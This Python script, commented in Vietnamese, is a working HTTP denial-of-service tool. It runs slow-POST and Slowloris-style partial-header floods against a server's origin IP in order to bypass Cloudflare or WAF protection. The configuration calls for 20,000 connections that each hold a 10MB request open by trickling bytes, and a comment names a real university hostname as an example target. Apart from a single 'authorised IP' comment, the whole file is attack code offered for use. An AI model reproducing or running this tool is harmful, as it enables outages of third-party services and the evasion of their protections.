#!/usr/bin/env python3
"""
TANCONG IP-OPTIMIZED - Direct IP Attack (No WAF)
=================================================

Tối ưu hóa cho tấn công trực tiếp vào IP (bypass Cloudflare/WAF):
- IP gốc không có WAF protection
- Có thể aggressive hơn (nhanh hơn, nhiều connections hơn)
- HTTP/1.1 Keep-Alive để tái sử dụng TCP

Key optimizations cho direct IP:
1. Aggressive Speed - Stagger thấp (0.1-0.5s) vì không sợ WAF block
2. High Volume - 500-1000 connections (không giới hạn bởi WAF)
3. Connection Reuse - Keep-Alive để gửi nhiều requests/connection
4. Pipeline Attack - Gửi liên tiếp requests trên 1 TCP

Usage:
    python3 tanCong_ip_optimized.py

Config:
    Sửa TARGET_IP, TARGET_PORT, PATH trong hàm main()
"""

import asyncio
import ssl
import random
import time
import socket
import signal
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from collections import defaultdict
from enum import Enum

# =============================================================================
# CONFIGURATION FOR DIRECT IP ATTACK
# =============================================================================

class AttackMode(Enum):
    SLOWLORIS = "slowloris"      # Giữ connections mở
    PIPELINE = "pipeline"        # Gửi nhiều requests/connection
    RAPID_CONNECT = "rapid"    # Mở nhiều connections nhanh


@dataclass
class IPAttackConfig:
    """
    Cấu hình tấn công IP trực tiếp (aggressive, no WAF).
    
    Vì không có WAF, ta có thể:
    - Stagger thấp (0.1-0.5s)
    - Nhiều connections hơn (500-1000)
    - Connection reuse (keep-alive)
    """
    # Target
    ip: str
    port: int = 80
    path: str = "/"
    use_ssl: bool = False
    hostname: Optional[str] = None  # Host header (nếu cần SNI)
    
    # Scale (aggressive vì không có WAF)
    max_connections: int = 500      # 500 connections (2.5x so với qua WAF)
    duration: int = 300             # 5 phút
    
    # Speed (nhanh vì không sợ WAF)
    stagger: float = 0.2            # 0.2s giữa connections (10x nhanh hơn)
    enable_jitter: bool = True
    
    # Connection reuse
    enable_keepalive: bool = True   # Giữ connection sống
    requests_per_conn: int = 3      # 3 requests per TCP connection
    
    # Attack mode
    mode: AttackMode = AttackMode.PIPELINE
    
    # Payload
    post_content_length: int = 10000000  # 10MB để giữ connection lâu
    chunk_size: int = 10                # Gửi 10 bytes mỗi lần
    chunk_interval: float = 1.0         # 1 giây giữa các chunk


# =============================================================================
# METRICS
# =============================================================================

@dataclass
class IPAttackMetrics:
    start_time: float = field(default_factory=time.time)
    total_connections: int = 0
    successful_attacks: int = 0
    active_connections: int = 0
    bytes_sent: int = 0
    tcp_established: int = 0
    errors: int = 0
    
    def display(self):
        elapsed = time.time() - self.start_time
        print(f"\n{'='*70}")
        print(f"🔥 IP-OPTIMIZED ATTACK METRICS")
        print(f"{'='*70}")
        print(f"⏱️  Time: {elapsed:.1f}s | Active: {self.active_connections}")
        print(f"🌐 TCP Established: {self.tcp_established}")
        print(f"📊 Total: {self.total_connections} | Success: {self.successful_attacks}")
        print(f"📦 Bytes: {self.bytes_sent:,}")
        if self.total_connections > 0:
            rate = (self.successful_attacks / self.total_connections) * 100
            print(f"📈 Success Rate: {rate:.1f}%")
        print(f"{'='*70}\n")


METRICS = IPAttackMetrics()
SHUTDOWN = asyncio.Event()


# =============================================================================
# IP ATTACKER
# =============================================================================

class IPDirectAttacker:
    """
    Attacker tối ưu cho direct IP (no WAF).
    
    Optimizations:
    1. Low stagger (0.2s) - nhanh vì không sợ rate limit
    2. Connection reuse - 3 requests per TCP
    3. Pipeline - gửi liên tiếp requests
    """
    
    def __init__(self, config: IPAttackConfig):
        self.config = config
        self.ssl_ctx = self._create_ssl() if config.use_ssl else None
        self.semaphore = asyncio.Semaphore(100)  # Cao hơn vì không có WAF
    
    def _create_ssl(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    
    async def attack_pipeline(self, conn_id: int):
        """
        PIPELINE ATTACK - Gửi nhiều requests trên 1 TCP connection.
        
        Hiệu quả gấp 3 lần Slowloris thông thường!
        """
        try:
            async with self.semaphore:
                # 1 TCP connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.config.ip,
                        self.config.port,
                        ssl=self.ssl_ctx
                    ),
                    timeout=10
                )
                
                METRICS.tcp_established += 1
                host = self.config.hostname or self.config.ip
                
                # Gửi nhiều requests trên 1 connection
                for req_idx in range(self.config.requests_per_conn):
                    if SHUTDOWN.is_set():
                        break
                    
                    success = await self._send_slow_post(
                        reader, writer, conn_id, req_idx, host
                    )
                    
                    if success:
                        METRICS.successful_attacks += 1
                    
                    # Nhỏ delay giữa các requests trên cùng connection
                    if req_idx < self.config.requests_per_conn - 1:
                        await asyncio.sleep(0.5)
                
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                    
        except Exception as e:
            METRICS.errors += 1
    
    async def _send_slow_post(
        self, reader: asyncio.StreamReader, 
        writer: asyncio.StreamWriter,
        conn_id: int, req_idx: int, host: str
    ) -> bool:
        """Gửi 1 slow POST request."""
        req_tag = f"CONN-{conn_id}-REQ{req_idx+1}"
        
        try:
            # Build POST request
            headers = (
                f"POST {self.config.path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {self.config.post_content_length}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            
            writer.write(headers)
            METRICS.bytes_sent += len(headers)
            await writer.drain()
            
            print(f"[{req_tag}] 🚀 POST sent, Content-Length: {self.config.post_content_length}")
            
            # Gửi body từng chunk
            bytes_sent = 0
            start_time = time.time()
            
            while (time.time() - start_time < self.config.duration and
                   bytes_sent < self.config.post_content_length and
                   not SHUTDOWN.is_set()):
                
                chunk = b"X" * self.config.chunk_size
                writer.write(chunk)
                METRICS.bytes_sent += len(chunk)
                bytes_sent += len(chunk)
                await writer.drain()
                
                # Chờ giữa các chunk
                await asyncio.sleep(self.config.chunk_interval)
                
                if bytes_sent % 100 == 0:
                    print(f"[{req_tag}] 📦 {bytes_sent} bytes sent")
            
            print(f"[{req_tag}] ✅ Completed ({bytes_sent} bytes)")
            return True
            
        except Exception as e:
            print(f"[{req_tag}] ⚠️ Error: {type(e).__name__}")
            return False
    
    async def attack_rapid_connect(self, conn_id: int):
        """
        RAPID CONNECT - Mở nhiều connections nhanh.
        
        Mỗi connection chỉ gửi headers rồi giữ mở.
        """
        try:
            async with self.semaphore:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.config.ip,
                        self.config.port,
                        ssl=self.ssl_ctx
                    ),
                    timeout=5
                )
                
                METRICS.tcp_established += 1
                METRICS.active_connections += 1
                host = self.config.hostname or self.config.ip
                
                # Gửi request chưa hoàn chỉnh (không có CRLF cuối)
                partial_request = (
                    f"GET {self.config.path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                ).encode()
                
                writer.write(partial_request)
                METRICS.bytes_sent += len(partial_request)
                await writer.drain()
                
                print(f"[RAPID-{conn_id}] 🚀 Connection established (no end headers)")
                
                # Giữ connection mở
                await asyncio.sleep(self.config.duration)
                
                METRICS.active_connections -= 1
                
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                    
        except Exception as e:
            METRICS.errors += 1
    
    async def run_attack(self):
        """Chạy full attack."""
        print(f"\n🎯 IP-DIRECT ATTACK (No WAF)")
        print(f"   Target: {self.config.ip}:{self.config.port}{self.config.path}")
        print(f"   Connections: {self.config.max_connections}")
        print(f"   Stagger: {self.config.stagger}s")
        print(f"   Mode: {self.config.mode.value}")
        
        if self.config.mode == AttackMode.PIPELINE:
            print(f"   Requests per connection: {self.config.requests_per_conn}")
            total_attacks = self.config.max_connections * self.config.requests_per_conn
            print(f"   Total attack requests: {total_attacks}")
        
        # Launch connections với stagger thấp
        tasks = []
        for i in range(1, self.config.max_connections + 1):
            if SHUTDOWN.is_set():
                break
            
            if self.config.mode == AttackMode.PIPELINE:
                task = asyncio.create_task(self.attack_pipeline(i))
            elif self.config.mode == AttackMode.RAPID_CONNECT:
                task = asyncio.create_task(self.attack_rapid_connect(i))
            
            tasks.append(task)
            
            # Stagger (nhanh vì không có WAF)
            stagger = self.config.stagger
            if self.config.enable_jitter:
                stagger *= random.uniform(0.8, 1.2)
            await asyncio.sleep(stagger)
            
            if i % 50 == 0:
                print(f"📊 Progress: {i}/{self.config.max_connections} connections launched")
        
        # Đợi tất cả hoàn thành
        await asyncio.gather(*tasks, return_exceptions=True)
        
        print(f"\n✅ Attack complete")


# =============================================================================
# MAIN
# =============================================================================

async def metrics_reporter():
    while not SHUTDOWN.is_set():
        await asyncio.sleep(15)
        if not SHUTDOWN.is_set():
            METRICS.display()


def signal_handler():
    SHUTDOWN.set()
    print("\n\n⚠️  Stopping attack...")


async def main():
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║        TANCONG IP-OPTIMIZED - Direct IP Attack                 ║
    ║                                                                ║
    ║  🎯 Target: Direct IP (bypass WAF/Cloudflare)                  ║
    ║  ⚡ Speed: 0.2s stagger (10x faster than WAF mode)              ║
    ║  📈 Scale: 500+ connections (no WAF limits)                    ║
    ║  🔄 Reuse: 3 requests per TCP connection                       ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Setup signals
    for sig in (signal.SIGINT, signal.SIGTERM):
        asyncio.get_event_loop().add_signal_handler(sig, signal_handler)
    
    # ⚠️ CẤU HÌNH - Sửa địa chỉ IP ở đây
    config = IPAttackConfig(
        ip="127.0.0.1",           # ← Sửa thành IP được cấp quyền
        port=8000,                # ← HTTP port
        path="/",                # ← Path cần tấn công
        use_ssl=False,           # ← HTTP = False, HTTPS = True
        
        # Nếu dùng HTTPS, cần hostname cho SNI
        hostname=None,           # ← VD: "web.uneti.edu.vn" (nếu cần)
        
        # Scale (có thể tăng vì không có WAF)
        max_connections=20000,      # ← 500 connections (tăng được nếu cần)
        duration=300,            # ← 5 phút per connection
        
        # Speed (nhanh vì không có WAF)
        stagger=0.2,             # ← 0.2s giữa connections
        
        # Mode
        mode=AttackMode.PIPELINE,  # ← PIPELINE hoặc RAPID_CONNECT
        requests_per_conn=3,       # ← 3 requests per TCP
    )
    
    # Start metrics
    metrics_task = asyncio.create_task(metrics_reporter())
    
    # Run attack
    attacker = IPDirectAttacker(config)
    await attacker.run_attack()
    
    # Final report
    SHUTDOWN.set()
    await asyncio.sleep(0.5)
    METRICS.display()
    
    print("\n🏁 Attack finished")
    print(f"   Target: {config.ip}:{config.port}")
    print(f"   Mode: Direct IP (no WAF)")
    print(f"   Effective requests: {METRICS.successful_attacks}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        SHUTDOWN.set()
        METRICS.display()
